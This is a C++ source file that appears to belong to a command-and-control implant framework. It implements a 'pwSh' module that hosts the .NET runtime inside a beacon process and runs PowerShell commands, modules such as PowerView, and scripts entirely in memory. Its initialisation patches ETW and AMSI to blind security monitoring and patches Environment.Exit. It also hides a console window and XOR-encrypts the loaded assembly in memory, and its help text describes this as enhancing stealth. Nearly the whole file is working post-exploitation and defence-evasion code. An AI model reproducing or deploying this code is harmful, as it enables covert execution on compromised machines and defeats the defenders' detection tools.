#include "PwSh.hpp"

#include <cstring>
#include <array>
#include <thread>


#ifdef _WIN32

#pragma comment(lib, "mscoree.lib")

using namespace mscorlib;

#endif


#include "Tools.hpp"
#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "pwSh";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) PwSh* PwShConstructor() 
{
    return new PwSh();
}

#else

__attribute__((visibility("default"))) PwSh* PwShConstructor() 
{
    return new PwSh();
}

#endif

PwSh::PwSh()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
#ifdef _WIN32
    m_firstRun=true;
    m_moduleLoaded=false;
    m_memEcrypted=false;

    m_pMetaHost = NULL;
    m_pRuntimeInfo=NULL;
    m_pClrRuntimeHost=NULL;
    m_pCustomHostControl=NULL;
    m_pCorHost=NULL;
    m_spAppDomainThunk=NULL;
    m_spDefaultAppDomain=NULL;
    m_targetAssembly=NULL;

    // need a console to catch output from dotnet when using non consol application
    // https://www.coresecurity.com/core-labs/articles/running-pes-inline-without-console
    if (GetConsoleWindow() == NULL)
    {
        AllocConsole();
        HWND conHandle = GetConsoleWindow();
        ShowWindow(conHandle, SW_HIDE);
    }

    // An interesting caveat that I found during the development of this tool was that while the redirection for PowerShell worked perfectly the first time, all subsequent calls failed.
    // This turned out to be because I was creating a new anonymous pipe on each run and closing it upon cleanup. PowerShell caches the first handle it uses for standard output and when it gets closed, the output redirection breaks down.
    // !!! we cannot reuse other pipe during all the life of this CLR -> unload / load new module will not work !
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    CreatePipe(&m_ioPipeRead, &m_ioPipeWrite, &sa, 0x100000);

#endif
}

PwSh::~PwSh()
{
#ifdef _WIN32
    clearAssembly();
    clearCLR();

    CloseHandle(m_ioPipeWrite);
    CloseHandle(m_ioPipeRead);
#endif
} 


int PwSh::clearCLR()
{
#ifdef _WIN32
    if(m_spDefaultAppDomain)
    {
        m_spDefaultAppDomain->Release();
        m_spDefaultAppDomain = NULL;
    }
    if(m_spAppDomainThunk)
    {
        m_spAppDomainThunk->Release();
        m_spAppDomainThunk = NULL;
    }
    if(m_pCorHost)
    {
        m_pCorHost->Release();
        m_pCorHost = NULL;
    }
    if (m_pClrRuntimeHost)
    {
        m_pClrRuntimeHost->Release();
        m_pClrRuntimeHost = NULL;
    }
    if(m_pCustomHostControl)
    {
        m_pCustomHostControl->Release();
        m_pCustomHostControl = NULL;
    }
    if(m_pRuntimeInfo)
    {
        m_pRuntimeInfo->Release();
        m_pRuntimeInfo = NULL;
    }
    if(m_pMetaHost)
    {
        m_pMetaHost->Release();
        m_pMetaHost = NULL;
    }
    if(m_targetAssembly)
    {
        delete m_targetAssembly;
        m_targetAssembly = NULL;
    }
    m_firstRun=true;
#endif
    return 0;
}


int PwSh::clearAssembly()
{
#ifdef _WIN32
    m_moduleLoaded=false;
    m_memEcrypted=false;
#endif
    return 0;
}


std::string PwSh::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "PwSh Module:\n";
    info += "This module allows you to load and execute a custom PowerShell instance entirely in memory.\n";
    info += "The execution occurs within the current process.\n\n";

    info += "Usage:\n";
    info += "  pwSh init\n";
    info += "      - Loads the fixed PowerShell runner DLL from Tools/Any/any/rdm.dll.\n";
    info += "      - The runner type is fixed to rdm.rdm and must implement Invoke(string command).\n\n";

    info += "  pwSh run <cmd>\n";
    info += "      - Executes the given PowerShell command.\n\n";


    info += "  pwSh import <scriptArtifact>\n";
    info += "      - Import the powersehll module from Scripts/Windows or Scripts/Any (e.g., PowerView.ps1)\n\n";

    info += "  pwSh script <scriptArtifact>\n";
    info += "      - execute the powersehll script from Scripts/Windows or Scripts/Any.\n\n";

    info += "Examples:\n";
    info += "  pwSh init\n";
    info += "  pwSh run whoami\n";
    info += "  pwSh run $x = 4; Write-Output $x\n\n";

    info += "Notes:\n";
    info += "  - Assemblies are kept in memory and can be reused without reloading.\n";
    info += "  - Ensure the correct type and method names are specified when using custom DLLs.\n";
    info += "  - This module avoids writing files to disk, enhancing stealth.\n";
    info += "  - If you run 'init' in a process with an incompatible CLR/AppDomain already loaded,\n";
    info += "    initialize PwSh from a fresh beacon process or a process without that CLR context.\n";
#endif
    return info;
}


#define loadModule "00001"
#define runDll "00003"
#define importModulePS "00004"
#define scriptPS "00005"


#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)

bool endsWithDLL(const std::string& str) 
{
    const std::string suffix = ".dll";
    if (str.size() >= suffix.size() && 
        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0) {
        return true;
    }
    return false;
}


bool endsWithEXE(const std::string& str) 
{
    const std::string suffix = ".exe";
    if (str.size() >= suffix.size() && 
        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0) {
        return true;
    }
    return false;
}

#endif


int PwSh::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)

    if ((splitedCmd.size() == 2 || splitedCmd.size() == 4) && splitedCmd[1] == "init")
    {
        std::string inputFile = "PowerShellRunner.dll"; // Default
        std::string type = "PowerShellRunner.PowerShellRunner"; // Default

        if (splitedCmd.size() == 4)
        {
            inputFile = splitedCmd[2];
            type = splitedCmd[3];
        }

        if (endsWithDLL(inputFile))
        {
            if (type.empty())
            {
                c2Message.set_returnvalue("For DLL, you must specify the fully-qualified type name, e.g., Namespace.ClassName.\n");
                return -1;
            }
        }
        else
        {
            c2Message.set_returnvalue("Invalid file type. Must be .dll or .exe\n");
            return -1;
        }

        std::ifstream myfile;
        myfile.open(inputFile, std::ios::binary);

        if (!myfile)
        {
            std::string newInputFile = m_toolsDirectoryPath + inputFile;
            myfile.open(newInputFile, std::ios::binary);
            inputFile = newInputFile;
        }

        if (!myfile)
        {
            c2Message.set_returnvalue("Couldn't open file.\n");
            return -1;
        }

        c2Message.set_inputfile(inputFile);

        std::string fileContent(std::istreambuf_iterator<char>(myfile), {});
        myfile.close();

        c2Message.set_cmd(loadModule);
        c2Message.set_data(fileContent.data(), fileContent.size());
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_args(type);
    }
    else if(splitedCmd.size()>=3 && splitedCmd[1]=="run")
    {
        std::string argument;
        if(splitedCmd.size()>=3)
        {
            for(int i=2; i<splitedCmd.size(); i++)
            {
                argument += splitedCmd[i];
                argument += " ";
            }
        }

        c2Message.set_cmd(runDll);
        c2Message.set_args(argument);
        c2Message.set_instruction(splitedCmd[0]);
    }
    else if(splitedCmd.size()==3 && splitedCmd[1]=="import")
    {
        std::string inputFile = splitedCmd[2];

        std::ifstream myfile;
        myfile.open(inputFile, std::ios::binary);

        if (!myfile)
        {
            std::string newInputFile = m_toolsDirectoryPath + inputFile;
            myfile.open(newInputFile, std::ios::binary);
            inputFile = newInputFile;
        }

        if (!myfile)
        {
            c2Message.set_returnvalue("Couldn't open file.\n");
            return -1;
        }

        c2Message.set_inputfile(inputFile);

        std::string fileContent(std::istreambuf_iterator<char>(myfile), {});
        myfile.close();

        std::string payload = "New-Module -ScriptBlock {\n";
        payload += fileContent;
        payload += "\nExport-ModuleMember -Function * -Alias *;};";

        c2Message.set_cmd(importModulePS);
        c2Message.set_args(payload);
        c2Message.set_instruction(splitedCmd[0]);
    }
    else if(splitedCmd.size()==3 && splitedCmd[1]=="script")
    {
        std::string inputFile = splitedCmd[2];

        std::ifstream myfile;
        myfile.open(inputFile, std::ios::binary);

        if (!myfile)
        {
            std::string newInputFile = m_toolsDirectoryPath + inputFile;
            myfile.open(newInputFile, std::ios::binary);
            inputFile = newInputFile;
        }

        if (!myfile)
        {
            c2Message.set_returnvalue("Couldn't open file.\n");
            return -1;
        }

        c2Message.set_inputfile(inputFile);

        std::string fileContent(std::istreambuf_iterator<char>(myfile), {});
        myfile.close();

        std::string payload = "Invoke-Command -ScriptBlock  {\n";
        payload += fileContent;
        payload += "};";

        c2Message.set_cmd(scriptPS);
        c2Message.set_args(payload);
        c2Message.set_instruction(splitedCmd[0]);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

#endif
    return 0;
}


#define ERROR_INIT_CLR_1 1 
#define ERROR_INIT_CLR_2 2
#define ERROR_INIT_CLR_3 3
#define ERROR_INIT_CLR_4 4
#define ERROR_INIT_CLR_5 5
#define ERROR_INIT_CLR_6 6
#define ERROR_INIT_CLR_7 7
#define ERROR_INIT_CLR_8 8

#define ERROR_LOAD_ASSEMLBY_1 11
#define ERROR_LOAD_ASSEMLBY_2 12
#define ERROR_LOAD_ASSEMLBY_3 13
#define ERROR_LOAD_ASSEMLBY_4 14
#define ERROR_LOAD_ASSEMLBY_5 15

#define ERROR_INVOKE_METHOD_1 21
#define ERROR_INVOKE_METHOD_2 22
#define ERROR_INVOKE_METHOD_3 23
#define ERROR_INVOKE_METHOD_4 24

#define ERROR_INVOKE_METHOD_11 31
#define ERROR_INVOKE_METHOD_12 32
#define ERROR_INVOKE_METHOD_13 33
#define ERROR_INVOKE_METHOD_14 34
#define ERROR_INVOKE_METHOD_15 35


int PwSh::process(C2Message &c2Message, C2Message &c2RetMessage)
{
#ifdef __linux__ 
#elif _WIN32

    string cmd = c2Message.cmd();

    int ret=0;
    if(m_firstRun)
    {
        ret = initCLR();
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }
        
        m_firstRun=false;
    }

    if(cmd==loadModule)
    {        
        std::string type = c2Message.args();

        ret = loadAssembly(c2Message.data(), type);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_returnvalue("Success");
        m_moduleLoaded=true;
    }
    else if(cmd==runDll)
    {                
        std::string argument = c2Message.args();

        std    ::string result;
        ret = invokeMethodDll(argument, result);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
    }
    else if(cmd==importModulePS)
    {                
        std::string argument = c2Message.args();

        std::string result;
        ret = invokeMethodDll(argument, result);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
    }
    else if(cmd==scriptPS)
    {                
        std::string argument = c2Message.args();

        std    ::string result;
        ret = invokeMethodDll(argument, result);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
    }

#endif

    return 0;
}


#ifdef _WIN32


#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


typedef HRESULT(WINAPI *funcCLRCreateInstance)
(
    REFCLSID  clsid,
    REFIID     riid,
    LPVOID  * ppInterface
);


static const GUID xCLSID_ICLRRuntimeHost = { 0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02} };


// https://www.coresecurity.com/core-labs/articles/running-pes-inline-without-console
// https://github.com/fortra/No-Consolation/blob/main/source/console.c
// https://kiewic.github.io/set-a-breakpoint-in-managed-code-cs-using-windbg
// https://github.com/EricEsquivel/Inline-EA/blob/9d36a278841180c7bbc8f360f2bf0797ea2ca39a/src/main.cpp#L194
// https://github.com/fortra/No-Consolation/blob/main/source/console.c
int PwSh::initCLR()
{
    // Patch EtwEventWrite
    patchEtw();

    // Patch AMSI
    patchAmsiPowershell();

    HMODULE hMscoree = LoadLibrary("mscoree.dll");

    //
    // Load CLR
    //
    funcCLRCreateInstance pCLRCreateInstance = NULL;
    pCLRCreateInstance = (funcCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");

    HRESULT hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&m_pMetaHost));
    if (FAILED(hr))
        return ERROR_INIT_CLR_1;

    hr = m_pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&m_pRuntimeInfo));
    if (FAILED(hr))
        return ERROR_INIT_CLR_2;

    BOOL loadable;
    hr = m_pRuntimeInfo->IsLoadable(&loadable);
    if (FAILED(hr))
        return ERROR_INIT_CLR_3;

    hr = m_pRuntimeInfo->GetInterface(xCLSID_ICLRRuntimeHost, IID_PPV_ARGS(&m_pClrRuntimeHost));
    if (FAILED(hr))
        return ERROR_INIT_CLR_4;
    
    m_pCustomHostControl = new MyHostControl();
    m_pClrRuntimeHost->SetHostControl(m_pCustomHostControl);

    // start the CLR
    hr = m_pClrRuntimeHost->Start();
    if (FAILED(hr))
        return ERROR_INIT_CLR_5;

    // Now we get the ICorRuntimeHost interface so we can use the normal (deprecated) assembly load API calls
    hr = m_pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&m_pCorHost);
    if (FAILED(hr))
        return ERROR_INIT_CLR_6;

    // Get a pointer to the default AppDomain in the CLR.
    hr = m_pCorHost->GetDefaultDomain(&m_spAppDomainThunk);
    if (FAILED(hr))
        return ERROR_INIT_CLR_7;

    hr = m_spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&m_spDefaultAppDomain));
    if (FAILED(hr))
        return ERROR_INIT_CLR_8;

    m_targetAssembly = new TargetAssembly();
    m_pCustomHostControl->setTargetAssembly(m_targetAssembly);


    //
    // patch exit - // https://www.outflank.nl/blog/2024/02/01/unmanaged-dotnet-patching/
    //
    _Assembly* mscorlib;
    m_spDefaultAppDomain->Load_2(SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);

    _Type* exitClass;
    mscorlib->GetType_2(SysAllocString(L"System.Environment"), &exitClass);

    _MethodInfo* exitInfo;
    BindingFlags exitFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Static);
    exitClass->GetMethod_2(SysAllocString(L"Exit"), exitFlags, &exitInfo);

    _Type* methodInfoClass;
    mscorlib->GetType_2(SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);

    _PropertyInfo* methodHandleProperty;
    BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
    methodInfoClass->GetProperty(SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProperty);

    VARIANT methodHandlePtr = {0};
    methodHandlePtr.vt = VT_UNKNOWN;
    methodHandlePtr.punkVal = exitInfo;

    SAFEARRAY* methodHandleArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    VARIANT methodHandleValue = {0};
    methodHandleProperty->GetValue(methodHandlePtr, methodHandleArgs, &methodHandleValue);

    _Type* rtMethodHandleType;
    mscorlib->GetType_2(SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);

    _MethodInfo* getFuncPtrMethodInfo;
    BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
    rtMethodHandleType->GetMethod_2(SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);

    SAFEARRAY* getFuncPtrArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    VARIANT exitPtr = {0};
    getFuncPtrMethodInfo->Invoke_3(methodHandleValue, getFuncPtrArgs, &exitPtr);

#if defined(_M_ARM64) || defined(__aarch64__)
    // ARM64: ret
    BYTE patch[] = { 0xC0, 0x03, 0x5F, 0xD6 };
#elif defined(_M_IX86) || defined(__i386__)
    // x86: ret
    BYTE patch[] = { 0xC3 };
#elif defined(_M_X64) || defined(__x86_64__)
    // x64: ret
    BYTE patch[] = { 0xC3 };
#else
    #error Unsupported architecture
#endif

    DWORD oldProt = 0;

    VirtualProtect(exitPtr.byref, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(exitPtr.byref, patch, sizeof(patch));
    FlushInstructionCache(GetCurrentProcess(), exitPtr.byref, sizeof(patch));
    VirtualProtect(exitPtr.byref, sizeof(patch), oldProt, &oldProt);

    return 0;
}


typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);


int PwSh::loadAssembly(const std::string& data, const std::string& type)
{
    //
    // Load the assembly from the data stream
    //
    CLRIdentityManagerProc pIdentityManagerProc = NULL;
    m_pRuntimeInfo->GetProcAddress("GetCLRIdentityManager", (void**)&pIdentityManagerProc);

    ICLRAssemblyIdentityManager* pIdentityManager;
    HRESULT hr = pIdentityManagerProc(IID_ICLRAssemblyIdentityManager, (IUnknown**)&pIdentityManager);
    if (FAILED(hr))
        return ERROR_LOAD_ASSEMLBY_1;
    
    m_pCustomHostControl->updateTargetAssembly(pIdentityManager, data);
    LPWSTR identityBuffer = m_pCustomHostControl->getAssemblyInfo();

    // With the modification done to the host control, we can now load the assembly with load2 as if it was on the dik
    BSTR assemblyName = SysAllocString(identityBuffer);
    // mscorlib::_AssemblyPtr spAssembly;
        hr = m_spDefaultAppDomain->Load_2(assemblyName, &m_spAssembly);
    if (FAILED(hr))
    {
        // std::cerr << "Load_2 failed: " << std::hex << hr << std::endl;
        // _com_error err(hr);
        // std::wcerr << L"Error message: " << err.ErrorMessage() << std::endl;
        SysFreeString(assemblyName);
        return ERROR_LOAD_ASSEMLBY_3;
    }
    SysFreeString(assemblyName);
    pIdentityManager->Release();


    //
    // Invoke the constructor of the class
    //
    if(m_spAssembly==nullptr)
        return ERROR_INVOKE_METHOD_11;

    // The .NET class to instantiate.
    bstr_t bstrClassName(type.data());

    // Get the Type of PwShRunner.
    hr = m_spAssembly->GetType_2(bstrClassName, &m_spType);
    if (FAILED(hr) || m_spType == NULL)
        return ERROR_INVOKE_METHOD_1;

    try
    {
        variant_t vtEmpty;
        variant_t vtInstance;
        hr = m_spType->InvokeMember_3(
            _bstr_t(L""),  // Empty string to invoke constructor
            static_cast<BindingFlags>(BindingFlags_CreateInstance | BindingFlags_Public | BindingFlags_Instance),
            NULL, vtEmpty, NULL, &m_vtInstance);
    }
    catch (_com_error &e)
    {
        return ERROR_INVOKE_METHOD_3;
    }
    catch (...)
    {
        return ERROR_INVOKE_METHOD_4;
    }


    return 0;
}


int PwSh::encryptMem()
{
    if(m_memEcrypted)
        return 0;
    else
    {
        std::string toto = "sdfsdgdfhgfk,jhgkfdssqSQSFD";
        m_pCustomHostControl->xorMemory(toto);
        m_memEcrypted=true;
    }
    return 0;
}


int PwSh::decryptMem()
{
    if(!m_memEcrypted)
        return 0;
    else
    {
        std::string toto = "sdfsdgdfhgfk,jhgkfdssqSQSFD";
        m_pCustomHostControl->xorMemory(toto);
        m_memEcrypted=false;
    }
    return 0;
}


#define RTL_MAX_DRIVE_LETTERS 32

typedef UNICODE_STRING* PUNICODE_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT                  Flags;
    USHORT                  Length;
    ULONG                   TimeStamp;
    UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS_CUSTOM
 {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS_CUSTOM, *PRTL_USER_PROCESS_PARAMETERS_CUSTOM;

struct PEB_LDR_DATA_CUSTOM
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
};

struct PEB_CUSTOM
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN SpareBits : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA_CUSTOM* Ldr;
    PRTL_USER_PROCESS_PARAMETERS_CUSTOM ProcessParameters;
    //...
};


// load AMSI
int PwSh::invokeMethodDll(const string& argument, std::string& result)
{
    // Convert argument to wstring
    wstring wCommand(argument.begin(), argument.end());

    // Convert to BSTR
    _bstr_t bstrCommand(wCommand.c_str());
    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = bstrCommand;

    VARIANT vtPSInvokeReturnVal;
    VariantInit(&vtPSInvokeReturnVal);

    // take care of the capture of the output
    PEB_CUSTOM * ProcEnvBlk = (PEB_CUSTOM *)GetPeb();
    PRTL_USER_PROCESS_PARAMETERS_CUSTOM processParameters = ProcEnvBlk->ProcessParameters;
    HANDLE consoleHandle = processParameters->StandardOutput;
    processParameters->StandardOutput = m_ioPipeWrite;

    try
    {
        // Create SAFEARRAY with one VARIANT element
        SAFEARRAY* psaInvokeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        LONG idx = 0;
        SafeArrayPutElement(psaInvokeArgs, &idx, &varCommand);

        HRESULT hr = m_spType->InvokeMember_3(
            _bstr_t(L"Invoke"),
            static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Public | BindingFlags_Instance),
            NULL,
            m_vtInstance,  // Pass the instance of PowerShellSession here
            psaInvokeArgs,
            &vtPSInvokeReturnVal);
    }
    catch (_com_error &e)
    {
        processParameters->StandardOutput = consoleHandle;

        return ERROR_INVOKE_METHOD_3;
    }
    catch (...)
    {
        processParameters->StandardOutput = consoleHandle;

        return ERROR_INVOKE_METHOD_4;
    }

    // Get the response
    wstring ws(vtPSInvokeReturnVal.bstrVal);
    std::string str(ws.begin(), ws.end());
    result += str;

    DWORD bytesAvailable = 0;
    BOOL res = PeekNamedPipe(m_ioPipeRead, NULL, 0, NULL, &bytesAvailable, NULL);
    if(res && bytesAvailable > 0)
    {
        DWORD outputLength = 0;
        std::string buffer;
        buffer.resize(0x100000);
        if (!ReadFile(m_ioPipeRead, buffer.data(), 0x100000, &outputLength, nullptr)) 
            return -100;
        buffer.resize(outputLength);

        result+=buffer;
    }

    processParameters->StandardOutput = consoleHandle;

    return 0;
}

#endif


int PwSh::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_INIT_CLR_1)
            errorMsg = "Failed: CLRCreateInstance";
        else if(errorCode==ERROR_INIT_CLR_2)
            errorMsg = "Failed: GetRuntime";
        else if(errorCode==ERROR_INIT_CLR_3)
            errorMsg = "Failed: RuntimeInfo - IsLoadable";
        else if(errorCode==ERROR_INIT_CLR_4)
            errorMsg = "Failed: RuntimeInfo - GetInterface CLRRuntimeHost";
        else if(errorCode==ERROR_INIT_CLR_5)
            errorMsg = "Failed: ClrRuntimeHost - Start";
        else if(errorCode==ERROR_INIT_CLR_6)
            errorMsg = "Failed: RuntimeInfo - GetInterface CorRuntimeHost";
        else if(errorCode==ERROR_INIT_CLR_7)
            errorMsg = "Failed: CorHost - GetDefaultDomain";
        else if(errorCode==ERROR_INIT_CLR_8)
            errorMsg = "Failed: AppDomainThunk - QueryInterface";
        
        else if(errorCode==ERROR_LOAD_ASSEMLBY_1)
            errorMsg = "Failed: IdentityManagerProc";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_2)
            errorMsg = "Failed: IdentityMnaager - GetBindingIdentityFromStream";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_3)
            errorMsg = "Failed: PwSh runner assembly could not be loaded in the current CLR AppDomain. This usually means the beacon process already has an incompatible CLR/AppDomain context; retry from a fresh beacon process or a process without an existing conflicting CLR. Original stage: DefaultAppDomain - Load_2";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_4)
            errorMsg = "Failed: DefaultAppDomain - Load_3";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_5)
            errorMsg = "Failed: No module loaded";

        else if(errorCode==ERROR_INVOKE_METHOD_1)
            errorMsg = "Failed: Assembly - GetType_2";
        else if(errorCode==ERROR_INVOKE_METHOD_2)
            errorMsg = "Failed: Type - InvokeMember_3";
        else if(errorCode==ERROR_INVOKE_METHOD_3)
            errorMsg = "Failed: InvokeMember_3 - COM exception";
        else if(errorCode==ERROR_INVOKE_METHOD_4)
            errorMsg = "Failed: InvokeMember_3 - unknown exception";

        else if(errorCode==ERROR_INVOKE_METHOD_11)
            errorMsg = "Failed: Assembly null";
        else if(errorCode==ERROR_INVOKE_METHOD_12)
            errorMsg = "Failed: Assembly - EntryPoint";
        else if(errorCode==ERROR_INVOKE_METHOD_13)
            errorMsg = "Failed: Invoke_3";
        else if(errorCode==ERROR_INVOKE_METHOD_14)
            errorMsg = "Failed: Invoke_3 - COM exception";
        else if(errorCode==ERROR_INVOKE_METHOD_15)
            errorMsg = "Failed: Invoke_3 - unknown exception";

        else
            errorMsg = "Failed: Unknown error";
    }
#endif
    return 0;
}
